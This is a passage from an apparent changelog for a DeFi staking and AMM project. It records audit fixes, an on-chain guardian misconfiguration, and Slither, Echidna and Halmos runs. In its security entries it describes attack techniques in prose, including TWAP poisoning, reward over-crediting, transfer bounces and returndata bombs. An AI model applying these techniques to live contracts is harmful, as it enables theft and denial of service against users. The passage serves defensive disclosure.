+monitoring views on TegridyStaking — `stakeCapUtilizationBps()` and `stakeCapHeadroom()`
+— for Forta / OZ Defender alerting at the 80% threshold, with 4 tests.
+
+**A negative result was kept rather than engineered around.** The first attempt at the
+staking invariant asserted the stricter `balance >= totalStaked + totalUnsettled`, and
+the fuzzer correctly broke it: under constant-rate emissions the funded reward pool can
+drain to `totalStaked` while unsettled credits remain. **That is an operational property,
+not a contract invariant** — so it was reclassified, and the requirement it actually
+implies was written into `TRUST_ASSUMPTIONS_MVP.md`: Phase 6 needs 6.4M+ TOWELI
+pre-funded and a monthly top-up keeper alerting at a 30-day-runway threshold.
+
+**Then all three were run for the first time, and none of them worked as shipped.**
+
+- The Echidna harness's `echidna_minLiquidityLocked` checked `pair.balanceOf(address(0))`,
+  copied from V2 — but `TegridyPair` locks MINIMUM_LIQUIDITY at `address(0xdead)`
+  (`TegridyPair.sol:169`), an intentional hardening to dodge transfer-to-zero edge cases.
+  **Pre-fix the property falsified with zero transactions: the seed state itself failed**,
+  so the campaign would have produced no signal at all. Post-fix smoke run (500 tests ×
+  30 seqlen, 4 workers, 620 calls, 7,495 unique instructions) passes all three
+  properties (`0693e4fd`).
+- `slither.config.json` could not be consumed by Slither 0.11.5 at all
+  (`be359b9f`): `detectors_to_run` / `detectors_to_exclude` were JSON arrays where Slither
+  calls `.split(",")` and crashes with `AttributeError: 'list' object has no attribute
+  'split'`. Worse, **`fail_high` / `fail_medium` / `fail_pedantic` / `fail_low` are not
+  valid Slither keys and were being silently ignored — the severity gate the config's own
+  comment advertised was never in effect.** Removed, with a schema note pointing future CI
+  at jq-grepping the JSON output instead. The run that then became possible returned 97
+  findings: **0 High, 0 Medium**, 96 Low, 1 Informational (reentrancy-benign 39,
+  calls-loop 36, reentrancy-events 11, missing-zero-check 6, events-maths 4,
+  boolean-equal 1), all 97 verified against `src/` as accepted patterns with inline
+  rationale, and **0 code patches required**. Triage written up in
+  [`contracts/AUDIT_SLITHER_TRIAGE.md`](contracts/AUDIT_SLITHER_TRIAGE.md) with the re-run
+  command and the gotchas. The same commit added the `contracts/.gitignore` entries for
+  `echidna-corpus/`, `.echidna-runs/`, `crytic-export/` and `halmos-cache/` — generated
+  artefacts only; the configs stay tracked.
+- Halmos needed two undocumented flags before it would run at all (`d01a2aed`): it
+  lazy-downloads its fallback solver and **refuses silently** without
+  `HALMOS_ALLOW_DOWNLOAD=1`, and the default `--storage-layout solidity` errors
+  `NotConcreteError: symbolic storage base slot` on every check touching a mapping keyed
+  by a symbolic address — 4 of the 6. Result: **5 passed, 1 failed in 108.87s**, with
+  214, 236 and 253 symbolic paths walked on the global-cap, per-user-cap and
+  principal-recoverable checks respectively, meaning every branch through `stake()` for
+  arbitrary `(amount, lockDuration)`. **The one failure is a tool limitation, and is
+  documented as such rather than as a contract bug**: `check_guardianCannotUnpause`
+  returns `Counterexample: ∅` — an empty counterexample, i.e. deterministic failure with
+  no symbolic inputs to assign — because under generic storage layout Halmos re-symbolises
+  the `OwnableNoRenounce._owner` slot between `setUp()` and the check body and then finds
+  a model where `_owner == pauseGuardian`. The concrete semantics are unambiguous
+  (`unpause()` at `src/TegridyStaking.sol:902` is `onlyOwner`, `guardianPause()` at :931
+  is `onlyPauseGuardian`, both covered 27/27 in
+  `MVPLaunch_StakeCapsAndGuardian.t.sol`), and the rule re-specs cleanly for Certora,
+  which does not need `vm.prank`. Triage and the Certora sketch are in
+  [`contracts/AUDIT_HALMOS_RESULTS.md`](contracts/AUDIT_HALMOS_RESULTS.md).
+
+### Security — the deploy script queued a factory-guardian rotation its own runbook could not execute (2026-05-24)
+
+Audit finding M6. `DeployMVP.s.sol` constructed the AMM factory as
+`new TegridyFactory(deployer, treasury, deployer)` — feeToSetter *and* guardian both the
+deployer EOA — and never rotated either. The guardian role is not decorative: it holds
+`emergencyDisablePair`, which is **instant and untimelocked** (re-enabling a pair still needs
+the normal 48h propose path), bounded only by `MAX_EMERGENCY_DISABLES_PER_DAY = 3`
+([TegridyFactory.sol:99](contracts/src/TegridyFactory.sol#L99),
+[:757](contracts/src/TegridyFactory.sol#L757)). One deploy key therefore retained a
+rate-limited denial-of-service over every pair, inside a script whose own header requires
+TREASURY / MULTISIG / PAUSE\_GUARDIAN to be three disjoint addresses precisely so that no
+single compromise captures a role. The constructor could not have caught it: it rejects only
+`address(0)` ([:204](contracts/src/TegridyFactory.sol#L204)) and never applies the
+`code.length ∉ {0, 23}` multisig-class gate that `setGuardian` and `proposeGuardianChange`
+both enforce.
+
+`17293d01` (one file, +10 lines) queued `factory.proposeGuardianChange(pauseGuardian)` inside
+`_wirePauseGuardian` while the deployer was still feeToSetter, and printed a runbook step `3b`
+telling the multisig to call `executeGuardianChange()` *after* step 3's `acceptFeeToSetter()`.
+
+**That order cannot work, and the reason was already in the same file the fix was written
+against.** Audit fix F-30-10 makes `acceptFeeToSetter` force-cancel any pending
+`GUARDIAN_CHANGE` left behind by the outgoing setter
+([TegridyFactory.sol:387](contracts/src/TegridyFactory.sol#L387)) — correct behaviour, so a
+captured setter cannot arm a hostile rotation for its successor to trip over, but it means
+step 3 destroys step 3b and `executeGuardianChange()` then reverts
+`NoPendingProposal(GUARDIAN_CHANGE)` out of
+[`TimelockAdmin._execute`](contracts/src/base/TimelockAdmin.sol). The one reachable sequence
+at this commit was for the **deployer** — still feeToSetter — to execute the rotation itself
+between +48h (`GUARDIAN_CHANGE_DELAY`) and +9d (`PROPOSAL_VALIDITY` is 7 days). Nothing
+printed said so. The commit body records why nothing caught it: `forge build` clean, and
+"no test references DeployMVP."
+
+Then it ran on mainnet. Per
+[`broadcast/DeployMVP.s.sol/1/run-latest.json`](contracts/broadcast/DeployMVP.s.sol/1/run-latest.json)
+— chain 1, 2026-06-07 — the factory went out with args `[deployer, treasury, deployer]` as
+the live `0xa24C7287…7a52`, and `proposeGuardianChange(0xCDCA0F06…F354)` was queued behind it
+as transaction 27. That broadcast cannot date the creation block, and it is worth saying why
+rather than quoting a number from it: the file carries 40 transactions against 16 receipts,
+and its two identifying paths disagree — the receipt matching the factory's own transaction
+hash has a null `contractAddress`, while the receipt that does carry the factory's
+`contractAddress` belongs, by hash, to the `TegridyTokenURIReader` creation one block over.
+Read the chain for a block number, not this file.
+
+A live read on **2026-08-19 at block 25794250** found `guardian()` and `feeToSetter()` both
+still the deployer EOA `0x14898258…456E` (zero code), `feeTo()` still the treasury Safe rather
+than the RevenueDistributor, and both deploy-time proposals expired unexecuted in mid-June
+with their slots still occupied. An expired proposal is not a free slot: `TimelockAdmin._propose`
+rejects on `_executeAfter[key] != 0` and never consults expiry, so the lapsed rotation now
+blocks a fresh one until someone calls `cancelGuardianChange()`. M6 existed so that "the EOA
+cannot be left holding the role unnoticed"; **the EOA held it unnoticed for 87 days.**
+
+Corrected in `dc446f17` (2026-08-21): construct with the guardian Safe directly and queue
+nothing — which is what
+[`script/base/DeployBaseMVP.s.sol`](contracts/script/base/DeployBaseMVP.s.sol) had always
+done — with `run()` re-asserting the `code.length ∉ {0, 23}` rule the constructor does not.
+Pinned by `test_DeployM6_runbookOrder_executeGuardianChangeRevertsAfterAcceptance`
+([TegridyFactory.t.sol:544](contracts/test/TegridyFactory.t.sol#L544)), which reads
+`GUARDIAN_CHANGE()` *before* the prank, because a getter between `vm.prank` and the call under
+test consumes the prank and would have left a green bare `expectRevert` proving nothing.
+`contracts/src/` was not touched: F-30-10 is right, the deploy script and its runbook were
+wrong about it. The on-chain rotation is still outstanding — the fix landed in the script, not
+in the factory.
+
+### Added — Phase 0 MVP cut: 30 contracts down to 15, a pause-guardian role, and stake caps (2026-05-22)
+
+The surface cut that everything else in this window is built on: ship the day-one
+economic loop and defer the rest to their own audited waves. **125 files changed, 1,192
+insertions against 54,040 deletions** — the commit puts it at roughly 13k LoC of contracts
+instead of 31.5k.
+
+- **Kept (15):** Toweli, TegridyFactory, TegridyPair, TegridyRouter, TegridyTWAP,
+  TegridyStaking + JbacVault + Admin, TegridyRestaking (paused at launch, opens Phase 7),
+  RevenueDistributor, ReferralSplitter, SwapFeeRouter + Admin, POLAccumulator,
+  TegridyTokenURIReader — the list comes to exactly fifteen. **Deferred:** Lending,
+  NFTLending, NFTPool, NFTPoolFactory, Gauges, VoteIncentives (+ Admin), DropV2,
+  LaunchpadV2, FeeHook, LPFarming, CommunityGrants, MemeBountyBoard, PremiumAccess —
+  each in its own audit wave. *The commit heads this "15 deleted", but the list it then
+  writes out names fourteen; the discrepancy is recorded rather than resolved, because
+  nothing in the commit says which contract the count is reaching for.*
+- **`src/base/PauseGuardian.sol`**, an additive emergency-pause role distinct from the
+  Ownable owner, wired onto every Pausable MVP contract (TegridyStaking, TegridyRestaking,
+  RevenueDistributor, SwapFeeRouter, POLAccumulator) as `setPauseGuardian(onlyOwner)` +
+  `guardianPause(onlyPauseGuardian)`. **Unpause stays owner-only, and rotation is
+  instant** — the reasoning recorded is that guardian compromise is recoverable via the
+  owner's unpause, so a fast rotation is the correct trade. Pattern lifted from Aave V3's
+  `EMERGENCY_ADMIN_ROLE` and Lido's GateSeal.
+- **Stake caps** on TegridyStaking (`maxStakePerUser`, `maxTotalStaked`), enforced in
+  `stake()` / `stakeWithBoost()` / `increaseAmount()`, defaulting to `type(uint256).max`
+  in the constructor so no existing fixture needed changing. `DeployMVP.s.sol` sets the
+  launch values — 50k per-user, 5M global TOWELI — before `transferOwnership`.
+- **`DeployMVP.s.sol` and `VerifyMVP.s.sol`**, both new: the canonical 15-contract deploy
+  requiring TREASURY / MULTISIG / PAUSE_GUARDIAN as env vars with a disjointness check
+  enforced at deploy time, wiring every one-shot setter and proposing the timelocked
+  changes; and **10 post-deploy invariants the operator must run green before announcing
+  live**, failing loud on any missing wire or multisig collapse. Plus
+  `TRUST_ASSUMPTIONS_MVP.md`, written ahead of time so paid auditors arrive briefed.
+- 23 new tests covering cap enforcement on all three paths and guardian semantics
+  (guardian can pause, cannot unpause, owner can unpause after, rotation is instant).
+  Storage-slot drift from the new layout was chased through 5 test files —
+  `SwapFeeRouter.accumulatedTokenFees` slot 9 → 10 and `TegridyStaking.positions` slot 15
+  → 17, **verified against `forge inspect <Contract> storage-layout` rather than assumed**
+  — and two `.broken` fuzz files that depended only on deferred contracts were deleted.
+- `foundry.toml` moved `optimizer_runs` from 1 to 200, on the stated theory that removing
+  the deferred contracts left the survivors with EIP-170 headroom. **That theory was
+  wrong and was corrected two days later** — see the 2026-05-24 EIP-170 entry, where
+  TegridyStaking measured 29,183 B over at both `runs=200` and `runs=1`.
+
+### Security — Three Wave-2 residuals from the threat-priority map: an unbound timelock executor, an untimelocked sweep, and a front-runnable CREATE2 salt (2026-05-21)
+
+Three items the 2026-05-16 threat-priority map had left standing, closed as separate PRs on the same day.
+
+- **A multisig could sign one value and execute another** ([#55](https://github.com/fomotsar-commits/tegridy-farms/pull/55)). `VoteIncentivesAdmin`'s four timelocked executors — `executeFeeChange`, `executeTreasuryChange`, `executeWhitelistChange`, `executeMinBribeAmount` — applied whatever `pendingX` held at execution time. **Between the multisig's propose-sign and its execute-sign, a captured key could `cancelXxx()` and then `proposeXxx(maliciousValue)`, and the signers' approval would land on the attacker's value.** Each executor now binds *both* the expected value and the expected `executeAfter` at sign time, mirroring the V2-LP-01 fix on `TegridyLaunchpadV2`; the ETA binding is what closes the second race, where the value is unchanged but a cancel-and-re-propose advances `readyAt`. New typed errors `FeeMismatch` / `TreasuryMismatch` / `WhitelistMismatch` / `MinBribeMismatch` plus a shared `ExecuteAfterMismatch`. `executeEnableCommitReveal` is parameterless and permissionless by design and is unchanged. **This is a breaking change for operator scripts**: any keeper or multisig calling the old signatures must read `pendingX()` + `xChangeTime()` immediately before signing and pass those exact values. Nine test files were updated mechanically, three fixed for the `vm.expectRevert` + view-call ordering trap (the `pendingX()` view dispatcher was being matched by `expectRevert` ahead of the executor call), two regression tests added; 179 VoteIncentives tests pass.
+- **`SwapFeeRouter.sweepETH` was an instant drain under owner compromise** ([#53](https://github.com/fomotsar-commits/tegridy-farms/pull/53)), the map's SwapFeeRouter ~6% Tier B entry. The earlier M2 fix had already hardcoded the destination to `revenueDistributor`, but a captured owner could still push the donated balance into RevenueDistributor's recovery pipeline in one transaction — 25% of an epoch's total per proposal, and the commit reads that pipeline as carrying no aggregate lifetime bound (RD ~12% Tier C). *That reading was already stale when it was written*: #28's M1, four days earlier, had put `MAX_LIFETIME_RECOVERY_BPS = 100` — 1% of `totalDistributed` — on `executeClaimRecovery`, alongside the forfeit side's existing lifetime cap. Recorded as the commit wrote it, corrected here. `sweepETH` becomes propose/execute/cancel with a **48h timelock and a 7-day validity window**, matched inline rather than by inheriting `TimelockAdmin` because the contract already uses inline timelocks and the commit records the 2,149-line file as risking a Yul stack-too-deep if it takes on another base. The amount is locked at proposal time and execution caps further at `balance - (accumulatedETHFees + totalPendingDistribution)`, so a depleting balance cannot be force-credited; pending state clears before the external call. The old `sweepETH()` selector survives as a `revert("Use proposeSweepETH()")` stub so off-chain monitors get a legible error rather than an unhandled-selector revert. 133 SwapFeeRouter-suite tests, all 156 `Deep_*.t.sol` attack-surface tests and the 8 PASS5 fee-router conservation invariants pass.
+- **A stranger could move your not-yet-deployed address** ([#51](https://github.com/fomotsar-commits/tegridy-farms/pull/51)). `TegridyLaunchpadV2` and `TegridyNFTPoolFactory` both used a *global* counter — `allCollections.length` / `_allPools.length` — as the CREATE2 salt nonce, so any second creator deploying first advanced the counter and shifted the deterministic address of a pending `createCollection` / `createPool`. Bounded grief rather than theft, but it breaks pre-funding and pre-announcement flows. Replaced with per-creator nonce mappings, read and incremented **before** the deploy so a future reentrancy cannot reuse a salt value. The arrays are kept for ID assignment and view getters; only their `.length` leaves the salt. New deploys land at different addresses than the old algorithm would have produced, already-deployed clones keep theirs, and the commit records that no off-chain consumer relied on predicting new addresses under the old formula. A regression test on each contract proves Bob's deploy no longer shifts Alice's predicted address — 37 tests, up from 35.
+
+### Internal — Cross-loan reward attribution pinned by five named invariants (2026-05-21)
+
+[#54](https://github.com/fomotsar-commits/tegridy-farms/pull/54). The 2026-05-16 threat-priority map named this the regression-prone surface — freeze the API, and require a dedicated audit pass on any future change to `loanRewardsSnapshot` / `escrowRewardsOwed` / `_clearPosition`. The existing `PASS7_LENDING_03` and `FRESH2026_F_LD_CrossLoanPullThenCap` tests exercise end-to-end *attack scenarios*, which is a different thing from pinning the properties they rely on. **Two focused tests now assert five invariants with one named assertion each, so a failure message identifies exactly which contract the regression broke:**
+
+- **I1** — `loanRewardsSnapshot[loanId] == staking.unsettledRewardsByTokenId(tokenId)` exactly at `acceptOffer`. No off-by-one, no transformation.
+- **I2** — that snapshot is immutable between `acceptOffer` and settlement; it is only written at open.
+- **I3** — on deferred settlement (staking paused), `escrowRewardsOwed[loanId]` is incremented by the **per-loan delta** (current − snapshot), not the gross per-tokenId bucket. The pre-loan slice belongs to the prior holder, not the current loan.
+- **I4** — `totalEscrowRewardsOwed == sum(escrowRewardsOwed[i])` holds across the deferral.
+- **I5** — `pullEscrowRewards` decrements `escrowRewardsOwed[loanId]` and `totalEscrowRewardsOwed` by exactly the amount paid, each.
+
+Full lending scope — 9 suites, 86 tests — passes with no regressions.
+
+### Security — The defensive scan of PR #28 found four follow-ons its own fixes had missed (2026-05-18 → 2026-05-21)
+
+A post-merge defensive scan of [#28](https://github.com/fomotsar-commits/tegridy-farms/pull/28) went back over the 2026-05-16 audit batch and found four more items. **Two were fixes that had landed on one call site and not its sibling; one was an arithmetic error inside the fix itself; one was a pre-existing structural gap the fix walked straight past.** These are corrections of the previous entry's work, kept as corrections.
+
+- **M10-revised — the fix itself over-credited the reward pool** ([#31](https://github.com/fomotsar-commits/tegridy-farms/pull/31)). The 2026-05-16 M10 fix introduced `_creditRewardPoolExcluding`, bumping `rewardPerTokenStored` by `recycled * ACC / (totalBoostedStake - contributorBoost)`. But `rewardPerTokenStored` is **global**, so the bump still applied to every staker: total pending growth came to `totalB * recycled / (totalB - C)`, which exceeds `recycled` whenever the caller had non-zero boost — **a 50% whale produced a 2× over-credit, quietly draining the reward pool.** Latent in the mainnet config, since it needs the operator to set both `extendFeeBps` and `extendFeeRecycleBps` above their default of 0, but a real over-pay vector if either were enabled. The replacement is the Yearn/Convex debt-advance pattern: `_creditRewardPool` divides by the *full* denominator so total pending growth is exactly `recycled`, and `p.rewardDebt += (boostedAmount * recycled) / totalBoostedStake` pre-cancels the caller's own share, which the immediately-following `_getReward` then consumes. `_creditRewardPoolExcluding` was deleted rather than patched. Two regression tests assert that the others' combined pending growth is at most `recycled` and that the whale's rebate is zero within 1 gwei; the audit document carries a POST-MERGE CORRECTION block under its M10 entry.
+- **M16-revised — the pause guard landed on two paths and not the transfer hook** ([#57](https://github.com/fomotsar-commits/tegridy-farms/pull/57)). The batch-5 M16 patch wrapped `_touch(msg.sender)` in `if (!paused())` inside `request`/`cancelEmergencyExit` only. Direct self-transfer is blocked by the M-5 `AlreadyHasPosition` guard, but a **bounce** slips it: an attacker holding a >24h-old NFT does `transferFrom(self, sock_puppet)`, waits out the 1h `TRANSFER_RATE_LIMIT`, then transfers back. The return leg fires `_touch(self)` in `_afterTokenTransfer` and the outgoing leg fires it through `_settleRewardsOnTransfer`'s DEEP-DS-04 path — either one refreshes `lastActivityAt[attacker]` indefinitely and defeats the 90-day `USER_INACTIVITY_GATE` on `claimUnsettledFor`. Closed by two paired one-line guards, at `TegridyStaking.sol:1519` and `:1712`.
+- **M4-revised — WETH was the one token that could still exit whole to treasury** (#57). LOW, latent, and explicitly *not* introduced by the M4 fix. That fix gated `withdrawTokenFees` on `uniFactory.getPair(token, WETH) != address(0)`, forcing tokens with a WETH pair through the TWAP-gated conversion so proceeds land in `accumulatedETHFees` and the 50/30/20 staker/POL/treasury split. But UniV2's factory rejects same-token pairs, so `getPair(WETH, WETH)` is `address(0)` and the gate passed for WETH — while both `convertTokenFeesToETH` variants explicitly rejected `token == WETH`. The only exit for `accumulatedTokenFees[WETH]`, which populates from WETH-input swaps at line 837, therefore went entirely to treasury. Fixed by *deleting* the WETH reject from the converter and adding a 1:1 unwrap branch — no swap, no TWAP, no cooldown, because there is no price and no MEV vector on a fixed rate — with the `MIN_TOKEN_FEE_FOR_CONVERSION` dust-grief floor preserved.
+- **M7-revised — the sibling port again, and this one locks escrowed principal** (#57). The audit named both `createOffer` and `acceptOffer`; the diff only modified `createOffer`. `TegridyNFTLending.acceptOffer:709-714` kept the raw `_executeAfter[WHITELIST_REMOVE] != 0` check, so an owner who proposed `WHITELIST_REMOVE(X)` and then neither executed nor cancelled created a permanent deadlock: past the 24h+7d window `TimelockAdmin` rejects both `_execute` (`ProposalExpired`) and a fresh `_propose` (`ExistingProposalPending`), while `acceptOffer` keeps reverting `CollectionPendingRemoval`. **Lender ETH already escrowed against collection X is locked until the owner calls `cancelRemoveCollection` — no community recourse.** `createOffer` had been spared because #28 gave it the auto-expiry short-circuit; `acceptOffer` is the more damaging path precisely because the funds are already committed. Both sites now route through one `_collectionPendingRemoval` helper: −16 lines of duplicated inline gate for +12 of helper and NatSpec, so they cannot drift again.
+
+Also in #31: four dedicated tests for the 2026-05-16 M1 lifetime cap, which had **no** direct regression test asserting `RecoveryExceedsLifetimeCap` ever fires. The suite's `_distribute` helper inflates `totalDistributed` to 1000 ether to give other tests headroom, and that inflation masked the cap everywhere it might have been exercised; a `_distributeRaw` helper without the inflation lets the four tests be exact about the denominator.
+
+Families 3 and 4 were re-checked clean afterwards (M6, M8, M9, M19; and the TWAP/Pair interop trio M13/M15/M17). **One item was left open on purpose**: only 2 of 26 timelock-inheriting contracts override `acceptOwnership` to clear pending proposals — M19's pattern — a mechanical port across 24 files deferred to a follow-up PR.
+
+### Security — fresh-2026 audit closure: 1 critical, 10 highs, 8 mediums — and two corrections to the audit's own reasoning (2026-05-20 → 2026-05-21)
+
+[#50](https://github.com/fomotsar-commits/tegridy-farms/pull/50) landed as eleven commits under a squash subject reading "1 critical + 7 highs from fresh-2026 audit (batches 1-4)". The commits inside close **one critical, ten highs and eight mediums** — five further fix batches landed after that subject was written. [#58](https://github.com/fomotsar-commits/tegridy-farms/pull/58) then cherry-picked the two fixes from the original PR #32 that #50's wider sweep had not absorbed, closing #32.
+
+**The critical: the restaking module and every lending market were structurally capped at 50 users.** `MAX_POSITIONS_PER_HOLDER` (50) applied uniformly in `_afterTokenTransfer`, including when `to` was the restaking contract or a whitelisted lending contract. The cap exists to bound the O(n) iteration in `votingPowerOf` / `aggregateActiveBoostBps`, and `restakingContract` was already short-circuited to 0 there — lending contracts were not, so simply carving them out of the cap would have opened an O(n_loans) view-DoS instead. The fix exempts both escrow address classes **and** extends the short-circuit to lending contracts symmetrically. Left as it was, TVL ceiling per market was 50 × `MIN_STAKE`.
+
+The highs, by surface:
+
+- **Staking** — `setJbacVault` is one-shot with no rotation, and `_clearPosition` called `vault.returnJbac` with no try/catch. A wrong address wired at that single shot, an ABI mismatch on a future vault, or a transient gas blow-up would have bricked the exit of **every JBAC-deposited position** across `withdraw` / `earlyWithdraw` / `emergencyExitPosition` / `executeEmergencyExit` / `emergencyWithdrawPosition`. Now wrapped, with stranded state recorded on the staking side and `retryReturnJbacFromVault` exposed for the owner once the vault path heals.
+- **GaugeController** — `quorumMet()` existed but `getGaugeEmission` / `getRelativeWeight*` did not consult it, so any downstream emission distributor that forgot the check would honour a single 1-wei voter as the entire allocation. Quorum is now baked into `_getRelativeWeightAt` so every caller fails closed below `MIN_VOTING_NFTS_PER_EPOCH = 3`; raw weights stay readable via `getGaugeWeight` for UIs. Separately, `executeRemoveGaugeNextEpoch` disabled a gauge without checking current-epoch votes, stranding that weight in an inflated denominator and silently diluting every other gauge in the epoch — the `GaugeHasActiveVotes` check already on `executeRemoveGauge` now guards it too.
+- **MemeBountyBoard** — `pendingPayoutTime` was set only on the *first* credit (`if (pendingPayoutTime[winner] == 0)`), so a winner with staggered payouts had every credit, including day-old ones, swept the moment the oldest crossed 365 days. Now overwritten unconditionally, matching the `refundTimestamp` pattern already used at lines 695/734/755/787.
+- **VoteIncentives** — a commit against a pair address that was never revealable (typo, frontend bug, malformed address) trapped the 10 TOWELI bond: `revealVote` reverted `InvalidPair`, and `forfeitCommitOnDisabledPair` reverted `PairNotDisabled` because `factory.disabledPairs` is false for a pair that was never registered. The bond sat until `revealDeadline` and was then swept to treasury — silent extraction from honest committers. New sibling `forfeitCommitOnInvalidPair` lets the committer recover it by proving (pair, power, salt) match the committed hash, with guards keeping the two escape paths disjoint.
+- **POLAccumulator** — `accumulate` had only `_twapMinOut`'s TWAP-anchored floor on the swap leg and no spot-vs-TWAP deviation gate, so a captured-key owner could sandwich-extract up to the full `TWAP_SAFETY_BPS` budget (~0.5%) per call. At `ACCUMULATE_COOLDOWN = 1h` and `maxAccumulateAmount = 10 ETH`, the commit puts the compounded upper-bound bleed at roughly **876 ETH/yr**. A new private `_assertSpotNearTWAP` mirrors the gate already inline in `_twapHarvestMinOut` at lines 906-920, same 50 bps.
+- **PremiumAccess** — inherited `acceptOwnership` without overriding it to flush pending `FEE_CHANGE` / `TREASURY_CHANGE` proposals, so a prior owner could pre-queue a hostile fee or an attacker-controlled treasury and hand the incoming owner a live executable queue. It was the asymmetric outlier: `TegridyLaunchpadV2` (lines 426-438) and `TegridyDropV2` (lines 1148-1180) already flushed.
+- **TegridyTWAP** — `update()` was permissionless on the `count == 0` bootstrap and `count <= 2` self-bootstrap grace branches. The observations themselves were marked `bypassed`, so `consult()` refused to serve them, but `lastSpot{0,1}` was overwritten **unconditionally** at lines 669-670 from caller-controlled reserves. For roughly **$3 plus flash-loan slippage** an attacker could create a pair with asymmetric reserves, seed three poisoned observations at `MIN_UPDATE_FEE` apiece, and have observation #4 trip `PriceDeviationTooLarge` — a ~24h TWAP DoS per new pair until `adminResetPair`, with downstream consumers failing closed and keepers paged. The owner gate that already covered the dormancy bypass now covers the bootstrap branches; permissionless deviation-gated updates resume once `count > 2`.
+- **TegridyRestaking / LPFarming**, the two originally-deferred highs — a new `waiveResidualClaim(tokenId)` lets a prior restaker who has sold the NFT release the per-tokenId `_residualClaimant` gate instantly, instead of the new owner waiting on a pool top-up or a 7-day owner timelock; and `NOTIFY_COOLDOWN` went 1h → 24h. **The commit corrects the audit's own framing here**: the original rationale, "match Synthetix (no top-ups mid-period)", inverts what Synthetix actually does — it rolls leftover over at notify time, exactly as this contract does. The real protection is sandwich cost, and 24h multiplies the whale's opportunity cost 24× without touching the economic model.
+
+The mediums, in brief: five `catch (bytes memory reason)` arms in `TegridyLending` and one in `TegridyNFTPoolFactory.claimPoolFeesBatch` were unbounded revert-reason copies — Solidity injects `returndatacopy(0, 0, returndatasize())` whenever a catch binds `bytes memory`, so a malicious per-offer `collateralContract` returning 16MB OOG-bricks the settlement path and locks the borrower's NFT together with the lender's principal. The batch commit records all five lending sites as switched to `catch {}` with a `_captureBoundedReason` helper capped at `MAX_REVERT_REASON_BYTES = 512`; the ultrareview below found the fifth had in fact been skipped. That same batch call gained `MAX_BATCH_CLAIM_POOLS = 50`. `TegridyNFTPool.swapETHForNFTs` incremented `spotPrice` with no ceiling, and pushing past `MAX_SPOT_PRICE = 1M ether` permanently bricked `proposeSpotPrice` — including legitimate *downward* repricings that were still above the cap. `TegridyDropV2`'s `SEQUENCER_GRACE_PERIOD` went 1h → 4h, because the 2024 Arbitrum outage ran ~80 minutes and Base outages have stretched multi-hour while the Dutch-auction decay clock kept ticking, handing snipers an outage discount. Two `emergencyWithdrawNFT` / `emergencyForceReturn` decrements got the clamp-to-zero guard the rest of the file already uses, so a drifted global cannot underflow-revert the one primitive a stuck user depends on. A `RefundBanked(caller, amount)` event now distinguishes "user tipped the protocol" from "user's `receive()` is broken". And two 3-arm catches in `SwapFeeRouter` whose branches did identical work collapsed to a single `catch {}`.
+
+**A third deferred high was withdrawn rather than fixed.** The "SafeERC721 returndata-bomb sweep across lending" rested on a wrong premise: Solidity's auto-decode for direct fixed-size returns reads only the encoded type size, not the full returndata, so the flagged direct calls (`getPosition`, `ownerOf`, `unsettledRewardsByTokenId`) are not bomb-vulnerable. The real vector was `catch (bytes memory reason)`, which batch 5 had already swept.
+
+#58 added the two stragglers. `TegridyNFTPool.swapNFTsForETH` cleared `_swapCaller` *after* `_sendETH`, so the seller's `receive()` executed while `_swapInFlight && _swapCaller == seller` still held and could stuff arbitrary tokenIds into `_heldIds` via `onERC721Received` — V3-NFTPOOL-01 had closed exactly this in the buy direction and missed the sell direction. And `TegridyStaking.stakeWithBoost` now rejects `_jbacTokenId == 0`: both `_clearPosition` and the vault's `returnJbac` use 0 as the "no JBAC" sentinel, so a collection that actually mints tokenId 0 (the BAYC/MAYC/CryptoPunks-derivative pattern) would deposit the NFT and then have both return paths short-circuit — a permanent strand. 127 NFTPool + 396 Staking tests pass.
+
+Two CI consequences are recorded in the same PR. `VoteIncentives` grew to **24,013 bytes** — 13 over the conservative 24,000-byte CI floor, still 563 under EIP-170's 24,576 — and was allowlisted rather than trimmed, on the stated argument that shaving 13 bytes out of just-audited security code is the worse trade and `Verify.s.sol` enforces the real limit before any address goes live. And a multi-agent cloud ultrareview of #50 found three genuine CI-blockers in #50 itself: a fifth identical `catch (bytes memory)` arm at `pullEscrowRewards:2231` that a block-level replace had skipped **while `_captureBoundedReason`'s own NatSpec already claimed that path was covered**, plus two test families the quorum bake-in and the new `GaugeHasActiveVotes` guard had deterministically broken.
+
+### Internal — A shared test-provider wrapper and three stale mocks, and two commits whose baselines do not reconcile (2026-05-20 → 2026-05-21)
+
+- [#49](https://github.com/fomotsar-commits/tegridy-farms/pull/49) added `src/test-utils/render.tsx`, exporting `renderWithProviders` and `ProvidersWrapper`, which wrap a subtree in `<MemoryRouter>` + `<ThemeProvider>` so a component test can mount any fragment that transitively calls `useTheme` or renders a `<Link>` without each file rolling its own wrapper. Wired into the two files throwing "useTheme must be used within a ThemeProvider": `OnboardingModal.test.tsx` (11 tests) and `SeasonalEvent.test.tsx` (8, which also needed the existing `test-utils/wagmi-mocks` side-effect import for a transitive `useConfig`). The commit is explicit about what it deliberately left — roughly 6 stale-mock failures, roughly 30 logic and selector-drift failures, and WagmiProvider-not-found in files that do not yet import `wagmi-mocks` — and about why the `continue-on-error: false` flip on the Unit Tests CI step was not made here: other families were still failing, so it would become a no-op cleanup only once they were cleared.
+- [#56](https://github.com/fomotsar-commits/tegridy-farms/pull/56) took three of those stale mocks. **Each `vi.mock(...)` block omitted an export that had been added to the underlying module after the mock was written, and each made the entire file fail at module load with "No `<export>` defined on mock"** — so the tests were not failing, they were never enumerated. `useToweliPrice.test.ts` was missing `safeGetItem` from `../lib/storage`, added when the hook gained a versioned cache read at construction (`safeJsonParse` added alongside for parity); `useSwap.test.ts` was missing `QUOTE_MAX_AGE_MS` from `./useSwapQuote`, added with the quote-staleness watchdog at L417, and `usePublicClient` from `wagmi`, added when `useSwap` moved to direct `viemClient.readContract`/`multicall` for the on-chain output-cap read. `useToweliPrice` went from 0 to all passing and `useSwap` from 0 to 11; the remaining 15 `useSwap` failures are `result.current is null`, a different failure class left for a separate fix.
+
+**The two commits do not agree on the baseline, and both are left as measured.** #49 records the full suite going 77 → 58 failing out of 800. #56 landed directly on top of it — `3c23db52`'s only parent is `d955f28f` — and records 77 failing / 723 passing → 74 failing / 749 passing, the same 77 starting point #49 says it had already cut to 58. **Branch ordering does not explain the gap, and neither commit acknowledges it.**
+
+### Fixed — The React root crashed without a WalletConnect projectId, and the ALLOWLIST mint had a UI on paper only (2026-05-20)
+
